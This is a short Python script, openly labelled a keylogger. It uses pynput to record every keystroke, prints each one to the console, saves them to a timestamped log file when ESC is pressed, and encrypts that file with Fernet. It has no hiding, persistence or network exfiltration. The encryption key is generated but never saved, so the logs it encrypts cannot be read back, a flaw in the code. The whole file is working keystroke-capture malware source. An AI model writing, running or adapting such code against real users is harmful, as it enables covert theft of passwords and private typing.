from pynput import keyboard
from datetime import datetime
import os
from cryptography.fernet import Fernet
import functools
# requires pip install pynput cryptography
# ========== Decorator to encrypt logs ==========
def encrypt_logs(func):
    @functools.wraps(func)
    def wrapper(self, *args, **kwargs):
        func(self, *args, **kwargs)
        # Encrypt the saved file
        try:
            with open(self.log_file, 'rb') as file:
                data = file.read()
            encrypted = self.cipher.encrypt(data)
            with open(self.log_file, 'wb') as file:
                file.write(encrypted)
            print(f"[+] Logs encrypted: {self.log_file}")
        except Exception as e:
            print(f"[!] Encryption failed: {e}")
    return wrapper

# ========== Logger Class ==========

class Logger:
    def __init__(self, log_dir="logs"):
        os.makedirs(log_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(log_dir, f"log_{timestamp}.txt")
        self.key_log = ""
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"[+] Logger initialized. Logging to: {self.log_file}")

    def _process_key(self, key):
        try:
            # Convert key to string
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                return f"[{key.name}]"
        except Exception as e:
            return f"[Error: {e}]"

    @encrypt_logs
    def save_logs(self):
        with open(self.log_file, "w", encoding="utf-8") as file:
            file.write(self.key_log)
        print(f"[+] Logs saved and ready for encryption")

    def on_press(self, key):
        try:
            key_str = self._process_key(key)
            self.key_log += key_str
            print(f"Pressed: {key_str}")
        except Exception as e:
            print(f"[!] Error capturing key: {e}")

    def on_release(self, key):
        # Stop logging with ESC
        if key == keyboard.Key.esc:
            print("[*] ESC pressed. Stopping logger.")
            return False

    def run(self):
        print("[*] Keylogger started. Press ESC to stop.")
        try:
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except Exception as e:
            print(f"[!] Listener error: {e}")
        self.save_logs()

# ========== Main ==========
if __name__ == "__main__":
    logger = Logger()
    logger.run()
